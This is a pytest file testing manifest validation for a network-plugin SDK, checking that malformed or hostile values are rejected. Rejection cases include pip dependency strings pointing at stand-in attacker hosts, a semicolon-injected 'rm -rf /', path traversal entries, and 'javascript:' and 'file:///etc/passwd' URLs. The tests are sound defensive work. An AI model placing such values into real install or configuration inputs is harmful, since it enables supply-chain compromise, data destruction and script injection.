"""Tests for PluginManifest validation."""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from freesdn_sdk.manifest import PluginManifest

# ── Valid manifests ──────────────────────────────────────────────────


VALID_YAML = """\
id: hello-world
name: Hello World
version: 1.0.0
class_name: HelloWorldPlugin
"""


def test_valid_manifest():
    m = PluginManifest.from_yaml_string(VALID_YAML)
    assert m.id == "hello-world"
    assert m.name == "Hello World"
    assert m.version == "1.0.0"
    assert m.class_name == "HelloWorldPlugin"
    assert m.entry_point == "plugin.py"
    assert m.license == "MIT"
    assert m.min_core_version == "1.0.0"


def test_full_manifest():
    yaml = """\
id: acme-monitor
name: ACME Monitor
version: 2.1.0
description: "Monitors ACME devices"
author: "ACME Corp"
license: Apache-2.0
homepage: https://acme.example.com
min_core_version: 1.0.0
class_name: AcmeMonitorPlugin
entry_point: monitor.py
api_prefix: /acme
permissions:
  - code: devices.read
    name: Read Devices
    description: Access device inventory
  - code: alerts.write
    name: Write Alerts
event_subscriptions:
  - device.status.*
  - alert.created
nav_items:
  - path: /acme
    label: ACME
    icon: Activity
    order: 40
settings_schema:
  type: object
  properties:
    check_interval:
      type: integer
python_dependencies:
  - httpx==0.24.1
"""
    m = PluginManifest.from_yaml_string(yaml)
    assert m.id == "acme-monitor"
    assert len(m.permissions) == 2
    assert m.api_prefix == "/acme"
    assert m.event_subscriptions == ["device.status.*", "alert.created"]
    assert m.python_dependencies == ["httpx==0.24.1"]
    assert m.nav_items[0].icon == "Activity"


def test_from_yaml_file(tmp_path):
    yaml_file = tmp_path / "plugin.yaml"
    yaml_file.write_text(VALID_YAML, encoding="utf-8")
    m = PluginManifest.from_yaml(str(yaml_file))
    assert m.id == "hello-world"


# ── Invalid ID patterns ─────────────────────────────────────────────


@pytest.mark.parametrize(
    "bad_id",
    [
        "A",  # Too short (single char), uppercase
        "Hello-World",  # Uppercase letters
        "-leading-dash",  # Leading dash
        "trailing-dash-",  # Trailing dash
        "has spaces",  # Spaces
        "has.dots",  # Dots
        "x" * 102,  # Too long
    ],
)
def test_invalid_id_rejected(bad_id):
    yaml = f"""\
id: "{bad_id}"
name: Test
version: 1.0.0
class_name: TestPlugin
"""
    with pytest.raises(ValidationError):
        PluginManifest.from_yaml_string(yaml)


# ── Reserved IDs ─────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "reserved_id",
    [
        "admin",
        "auth",
        "api",
        "core",
        "system",
        "devices",
        "alerts",
        "users",
        "settings",
        "backup",
        "vpn",
        "automation",
        "webhooks",
        "ai",
        "collector",
        "integrations",
        "plugins",
        "marketplace",
        "health",
        "status",
        "metrics",
        "internal",
    ],
)
def test_reserved_id_rejected(reserved_id):
    yaml = f"""\
id: {reserved_id}
name: Test
version: 1.0.0
class_name: TestPlugin
"""
    with pytest.raises(ValidationError, match="reserved"):
        PluginManifest.from_yaml_string(yaml)


# ── Invalid version ─────────────────────────────────────────────────


@pytest.mark.parametrize(
    "bad_version",
    [
        "1.0",  # Missing patch
        "1.0.0.0",  # Extra segment
        "1.0.a",  # Non-numeric
        "v1.0.0",  # Prefix
        "latest",  # Not semver
    ],
)
def test_invalid_version_rejected(bad_version):
    yaml = f"""\
id: test-plugin
name: Test
version: "{bad_version}"
class_name: TestPlugin
"""
    with pytest.raises(ValidationError):
        PluginManifest.from_yaml_string(yaml)


# ── Entry point validation ──────────────────────────────────────────


@pytest.mark.parametrize(
    "bad_entry",
    [
        "../escape.py",  # Path traversal
        "/absolute.py",  # Absolute path
        "\\\\windows.py",  # Windows path
        "plugin.txt",  # Not .py
        "plugin!.py",  # Invalid characters
        "plugin$.py",  # Invalid characters
        "plugin name.py",  # Spaces
    ],
)
def test_invalid_entry_point_rejected(bad_entry):
    yaml = f"""\
id: test-plugin
name: Test
version: 1.0.0
class_name: TestPlugin
entry_point: "{bad_entry}"
"""
    with pytest.raises(ValidationError):
        PluginManifest.from_yaml_string(yaml)


@pytest.mark.parametrize(
    "good_entry",
    [
        "plugin.py",
        "my_plugin.py",
        "src/plugin.py",
        "plugins/my-plugin.py",
    ],
)
def test_valid_entry_point_accepted(good_entry):
    yaml = f"""\
id: test-plugin
name: Test
version: 1.0.0
class_name: TestPlugin
entry_point: "{good_entry}"
"""
    m = PluginManifest.from_yaml_string(yaml)
    assert m.entry_point == good_entry


# ── Class name validation ───────────────────────────────────────────


@pytest.mark.parametrize(
    "bad_class",
    [
        "123NotValid",  # Starts with digit
        "has-dashes",  # Dashes
        "has spaces",  # Spaces
        "_PrivatePlugin",  # Leading underscore
        "__DunderPlugin",  # Double underscore
    ],
)
def test_invalid_class_name_rejected(bad_class):
    yaml = f"""\
id: test-plugin
name: Test
version: 1.0.0
class_name: "{bad_class}"
"""
    with pytest.raises(ValidationError):
        PluginManifest.from_yaml_string(yaml)


# ── API prefix validation ───────────────────────────────────────────


@pytest.mark.parametrize(
    "good_prefix",
    [
        "/my-plugin",
        "/acme",
        "/my_plugin/v2",
        "/a1",
    ],
)
def test_valid_api_prefix_accepted(good_prefix):
    yaml = f"""\
id: test-plugin
name: Test
version: 1.0.0
class_name: TestPlugin
api_prefix: "{good_prefix}"
"""
    m = PluginManifest.from_yaml_string(yaml)
    assert m.api_prefix == good_prefix


def test_api_prefix_none_accepted():
    m = PluginManifest.from_yaml_string(VALID_YAML)
    assert m.api_prefix is None


@pytest.mark.parametrize(
    "bad_prefix",
    [
        "no-leading-slash",  # Missing /
        "/UPPERCASE",  # Uppercase
        "/../admin",  # Path traversal
        "/has spaces",  # Spaces
        "/has$pecial",  # Special characters
    ],
)
def test_invalid_api_prefix_rejected(bad_prefix):
    yaml = f"""\
id: test-plugin
name: Test
version: 1.0.0
class_name: TestPlugin
api_prefix: "{bad_prefix}"
"""
    with pytest.raises(ValidationError):
        PluginManifest.from_yaml_string(yaml)


# ── Python dependencies validation ──────────────────────────────────


# Exact pins only. A loose specifier lets a transitive upgrade change what
# actually runs on an operator's appliance between validate and install, so the
# runtime refuses one -- and these cases used to assert the opposite.
@pytest.mark.parametrize(
    "good_deps",
    [
        ["requests==2.28.0"],
        ["httpx==0.24.1", "pydantic==2.0.3"],
        ["my-package==1.0.0"],
        ["PyYAML==6.0.1"],
    ],
)
def test_valid_python_deps_accepted(good_deps):
    deps_yaml = "\n".join(f"  - {d}" for d in good_deps)
    yaml = f"""\
id: test-plugin
name: Test
version: 1.0.0
class_name: TestPlugin
python_dependencies:
{deps_yaml}
"""
    m = PluginManifest.from_yaml_string(yaml)
    assert m.python_dependencies == good_deps


@pytest.mark.parametrize(
    "bad_dep",
    [
        "-e git+https://attacker.com/evil.git",  # pip -e flag
        "-r requirements.txt",  # pip -r flag
        "--index-url https://evil.com/simple",  # pip option
        "module;rm -rf /",  # Semicolon injection
        "!invalid",  # Special char start
        "requests>=2.28",  # Loose specifier - refused at install
        "httpx~=0.24.0",  # Compatible-release specifier - same
        "requests",  # Unpinned entirely
        "requests[socks]==2.31.0",  # Extras pull in an unpinned tree
    ],
)
def test_invalid_python_dep_rejected(bad_dep):
    yaml = f"""\
id: test-plugin
name: Test
version: 1.0.0
class_name: TestPlugin
python_dependencies:
  - "{bad_dep}"
"""
    with pytest.raises(ValidationError):
        PluginManifest.from_yaml_string(yaml)


# ── Homepage validation ─────────────────────────────────────────────


@pytest.mark.parametrize(
    "good_url",
    [
        "https://example.com",
        "http://localhost:8080",
        "https://github.com/freesdn/freesdn",
    ],
)
def test_valid_homepage_accepted(good_url):
    yaml = f"""\
id: test-plugin
name: Test
version: 1.0.0
class_name: TestPlugin
homepage: "{good_url}"
"""
    m = PluginManifest.from_yaml_string(yaml)
    assert m.homepage == good_url


@pytest.mark.parametrize(
    "bad_url",
    [
        "ftp://example.com",  # Not http/https
        "javascript:alert(1)",  # XSS
        "file:///etc/passwd",  # Local file
        "data:text/html,<h1>hi</h1>",  # Data URI
    ],
)
def test_invalid_homepage_rejected(bad_url):
    yaml = f"""\
id: test-plugin
name: Test
version: 1.0.0
class_name: TestPlugin
homepage: "{bad_url}"
"""
    with pytest.raises(ValidationError):
        PluginManifest.from_yaml_string(yaml)


# ── Edge cases ───────────────────────────────────────────────────────


def test_missing_required_fields():
    """id, name, version, class_name are required."""
    with pytest.raises(ValidationError):
        PluginManifest.from_yaml_string("name: Test")


def test_empty_yaml():
    with pytest.raises((ValidationError, Exception)):
        PluginManifest.from_yaml_string("")


def test_file_not_found():
    with pytest.raises(FileNotFoundError):
        PluginManifest.from_yaml("/nonexistent/plugin.yaml")


def test_defaults():
    m = PluginManifest.from_yaml_string(VALID_YAML)
    assert m.description == ""
    assert m.author == ""
    assert m.dependencies == []
    assert m.permissions == []
    assert m.event_subscriptions == []
    assert m.python_dependencies == []
    assert m.nav_items == []
    assert m.settings_schema is None
    assert m.api_prefix is None
    assert m.homepage is None
